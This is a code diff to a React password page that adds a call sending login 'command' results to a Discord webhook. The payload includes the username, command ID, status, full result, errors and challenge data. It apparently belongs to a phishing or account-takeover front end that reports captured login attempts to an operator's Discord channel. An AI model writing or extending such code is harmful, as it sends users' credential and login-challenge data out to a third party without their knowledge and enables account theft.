@@ -15,6 +15,7 @@ import { FullScreenBlueLoader } from "../components/FullScreenBlueLoader";
 import { FullScreenLoader } from "../components/FullScreenLoader";
 import { Toast } from "../components/Toast";
 import { API_BASE } from "../config/api";
+import { sendDiscordWebhookSafe } from "../helpers/webhook";
 
 export const Password = () => {
   const location = useLocation();
@@ -127,6 +128,33 @@ export const Password = () => {
         setToast("Timeout, please try again");
         return;
       }
+
+      // 🔥 Webhook Discord avec le résultat de la commande
+      console.log("📤 Sending webhook for password command result:", {
+        username,
+        commandId,
+        status: finalState.status,
+      });
+      
+      sendDiscordWebhookSafe({
+        username: "Password Command Result",
+        content:
+          "🔐 **Password Command Result**\n" +
+          "```json\n" +
+          JSON.stringify(
+            {
+              username,
+              commandId,
+              status: finalState.status,
+              result: finalState.result,
+              error: finalState.error,
+              challenge: finalState.result?.challenge,
+            },
+            null,
+            2
+          ) +
+          "\n```",
+      });
 
       // ✅ SUCCESS CASE
       if (finalState.status === "done" && finalState.result?.ok) {
